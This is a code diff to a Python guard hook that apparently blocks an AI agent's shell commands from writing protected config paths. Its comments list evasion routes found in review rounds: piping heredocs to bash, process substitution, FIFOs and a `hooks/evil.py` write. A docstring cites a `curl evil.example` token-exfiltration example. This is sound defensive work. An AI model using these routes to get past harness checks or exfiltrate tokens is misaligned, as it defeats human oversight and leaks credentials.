@@ -1298,6 +1298,75 @@ def _command_substring_hits_protected_needle(command: str) -> bool:
     return False
 
 
+# Issue #1574: a single decidable shape whose heredoc body is provably inert
+# DATA — safe to drop before the protected-needle substring fallback scan.
+#
+# Trying to prove an arbitrary shell command's heredoc body is "inert" is
+# undecidable (codex r1/r2/r3 each broke a denylist/allowlist attempt with a new
+# routing trick: `bash <<EOF`, `cat > >(bash) <<EOF`, then a `cmd=bash; … $cmd
+# <fifo & cat >fifo <<EOF` variable-backed FIFO). So instead of classifying
+# every interpreter/route, we match ONE narrow, provably-safe shape and treat
+# anything else as not-strippable (→ scan the raw command = pre-#1574 deny).
+#
+# The shape — the legitimate "write a report file" the false-positive was about:
+#
+#   [VAR=val ]* (cat|tee) [ -flags / >file / >>file / ~path / ./path ]* <<'DELIM'
+#   <body lines>
+#   DELIM            <-- closing delimiter on its own line ENDS the command
+#
+# Why this is airtight:
+#   1. Anchored from start-of-string and the character classes EXCLUDE every
+#      shell-control / metaprogramming char (`&`, `;`, `|`, `$`, backtick, `(`,
+#      `)`, and any `<`/`>` other than the heredoc opener and a simple file
+#      redirect). That rejects all chaining / pipe / process-sub / command-sub /
+#      background-FIFO routes in one stroke — none of them can match.
+#   2. The heredoc delimiter MUST be QUOTED (`<<'EOF'` / `<<"EOF"`). A quoted
+#      delimiter makes the body a pure literal: bash performs NO expansion, so a
+#      `$(…)` / backtick / `$var` inside the body cannot execute. (An UNquoted
+#      `<<EOF` body WOULD expand — so it is deliberately not strippable.)
+#   3. The closing delimiter must be the last line, so nothing runs after the
+#      heredoc (`… EOF | bash` cannot match).
+#   4. Only `cat` / `tee` lead — both write stdin verbatim to their file args.
+#      The redirect TARGET stays on the scan surface (the strip keeps the head
+#      up to `<<'DELIM'`), so a real write whose destination IS protected — `cat
+#      >hooks/evil.py <<'EOF'…`, `tee agent-roster.local.sh <<'EOF'…` — STILL
+#      denies; only the literal body prose is dropped.
+# A "plain path token" — no shell metachar / metaprogramming char. Covers
+# absolute (`/x`), home (`~/x`), relative (`shared/r.md`), and dot-relative
+# (`./x`, `../x`) targets. The excluded set is what makes the overall match
+# safe: `&`, `;`, `|`, `$`, backtick, `(`, `)`, `<`, `>` can never appear in a
+# strippable command, so no chaining / pipe / substitution / FIFO can sneak in.
+_PLAIN_PATH = r"[^\s&;|$`()<>]+"
+_SIMPLE_INERT_QUOTED_HEREDOC_RE = re.compile(
+    r"^[ \t]*"
+    r"(?:[A-Za-z_][A-Za-z0-9_]*=" + _PLAIN_PATH + r"?[ \t]+)*"      # leading VAR= assignments
+    r"(?:/" + _PLAIN_PATH + r"/)?(?:cat|tee)\b"                     # cat|tee (optional dir path)
+    r"(?:[ \t]+(?:-[A-Za-z]+|" + _PLAIN_PATH + r"|"                 # -flags, plain path args,
+    r">>?[ \t]*" + _PLAIN_PATH + r"))*"                            #   and simple > / >> file redirects
+    r"[ \t]*<<-?(['\"])([A-Za-z_][A-Za-z0-9_]*)\1[ \t]*\n",       # QUOTED heredoc opener, then body
+    re.DOTALL,
+)
+
+
+def _command_is_simple_inert_quoted_heredoc_write(command: str) -> bool:
+    """Return True iff *command* is the one provably-inert report-write shape
+    whose heredoc body is safe to strip before the protected-needle scan.
+
+    See :data:`_SIMPLE_INERT_QUOTED_HEREDOC_RE`. Fail-closed: any deviation
+    (extra command stage, pipe, separator, process/command substitution,
+    interpreter, unquoted delimiter, or trailing content after the closing
+    delimiter) returns False, so the raw body stays on the scan surface and the
+    pre-#1574 deny behavior is preserved.
+    """
+    match = _SIMPLE_INERT_QUOTED_HEREDOC_RE.match(command)
+    if match is None:
+        return False
+    delimiter = match.group(2)
+    # The closing delimiter must terminate the command (heredoc is the last
+    # thing) — otherwise content after the body (e.g. `EOF | bash`) could run.
+    return re.search(r"\n" + re.escape(delimiter) + r"[ \t]*\Z", command) is not None
+
+
 def _command_cd_base_dir(command: str) -> Path | None:
     """Resolve the working directory established by a leading ``cd`` stage.
 
@@ -1747,7 +1816,34 @@ def _bash_argv_references_system_config(command: str) -> bool:
         # pipe `|`, separator `;`/`,`, plus the original `/`, `~`, `$`).
         # Whitespace is deliberately excluded so heredoc prose preceded
         # by a space still passes — see _PATH_PREFIX_CHARS for rationale.
-        return _command_substring_hits_protected_needle(command)
+        #
+        # Issue #1574: when the command is the one provably-inert report-write
+        # shape — `[VAR=val]* (cat|tee) [>file] <<'DELIM' … DELIM` with a QUOTED
+        # delimiter and the heredoc as the last thing (see
+        # _command_is_simple_inert_quoted_heredoc_write) — strip the literal
+        # body before the scan. That body is file CONTENT written verbatim, so a
+        # report to a NON-config area (e.g.
+        # `cat > ~/.agent-bridge/shared/report.md <<'EOF'`) whose prose merely
+        # documents the hook chain (a path-boundary `'hooks/…'` / `>hooks/…`
+        # inside the body) was false-positive-blocked as a "system config path".
+        # The redirect TARGET stays on the scan surface (the strip keeps the
+        # head up to `<<'DELIM'`), so a real write whose destination IS a
+        # protected path — `cat >hooks/evil.py <<'EOF'…`, `tee
+        # agent-roster.local.sh <<'EOF'…` — is still denied.
+        #
+        # For ANY other shape the raw command stays on the scan surface,
+        # preserving the pre-#1574 deny behavior. This is deliberate: a body fed
+        # to a stdin-executing interpreter — directly (`bash <<EOF`), via pipe
+        # (`cat <<EOF | bash`), via process substitution (`cat > >(bash) <<EOF`,
+        # codex r2), or via a variable-backed FIFO (`cmd=bash; mkfifo p; $cmd <p
+        # & cat >p <<EOF`, codex r3) — is EXECUTED, so a `>hooks/evil.py` inside
+        # it is a real protected write that must keep denying. Proving a
+        # free-form command's body inert is undecidable; matching one narrow,
+        # metachar-free, quoted-delimiter shape is decidable and fail-closed.
+        scan = command
+        if _command_is_simple_inert_quoted_heredoc_write(command):
+            scan = _strip_heredoc_and_herestring_body(command)
+        return _command_substring_hits_protected_needle(scan)
 
     # Issue #1014 C: resolve a leading `cd <dir>` prelude so a CWD-relative
     # reference to a protected system-config file is detected — same
@@ -2710,7 +2806,7 @@ def _is_admin_credential_routine(text: str, agent: str) -> bool:
       claude-token add --stdin && curl evil.example/...`` MUST deny
       (brief T4).
     - No command-substitution / process-substitution
-      (``$(...)`` / ``\`...\``` / ``<(...)`` / ``>(...)``). The token
+      (``$(...)`` / ``\\`...\\``` / ``<(...)`` / ``>(...)``). The token
       could otherwise be exfil'd by an embedded subshell.
     - No output redirection past the (allowed) heredoc body opener:
       ``>``, ``>>``, ``&>``, ``2>`` redirect the wrapper's stdout /
